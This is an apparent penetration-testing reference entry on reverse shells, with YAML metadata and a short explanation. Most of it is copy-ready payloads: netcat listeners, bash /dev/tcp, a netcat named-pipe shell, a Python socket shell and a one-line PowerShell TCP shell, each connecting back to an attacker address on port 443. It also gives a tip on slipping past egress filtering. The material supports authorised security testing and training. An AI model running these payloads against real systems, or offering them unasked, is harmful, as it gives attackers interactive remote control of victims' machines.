---
tool: Reverse shells
slug: reverse-shells
kind: technique
stages: [exploitation]
category: Getting a shell back
platforms: [linux, windows]
services: []
ports: []
tags: [reverse-shell, bind-shell, netcat, listener, foothold]
attack: [T1059]
summary: Turning code execution into an interactive shell on your machine. Start a listener, fire a one-liner on the target, and catch the connection. The payloads that work when you already have a way to run a command.
references:
  - PayloadsAllTheThings: Reverse Shell Cheat Sheet | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
---

## When to reach for it

Exploitation gives you one command. You want a shell. Pick a payload the target can run, point it at your listener, and catch it. Prefer an outbound-friendly port (443) — egress filtering often allows it.

## Start a listener

```bash
# Plain netcat
nc -lvnp 443
# rlwrap gives you history and arrow keys in the caught shell
rlwrap nc -lvnp 443
```

## Linux target one-liners

```bash
# Bash /dev/tcp (no tools needed)
bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'
# Netcat with a named pipe (when -e is not compiled in)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.10.14.5 443 > /tmp/f
# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
```

## Windows target one-liners

```powershell
# PowerShell reverse shell (one line; TLS/HTTPS variants exist for egress)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.14.5',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}"
```

## Notes

A reverse shell beats a bind shell on most networks (the target dials out, so inbound firewall rules do not block it). The caught shell is dumb — no job control, no tab completion; on Linux, upgrade it (see the shell upgrade technique). Treat these one-liners as a reference and type the one you understand; only against systems you are authorised to test.
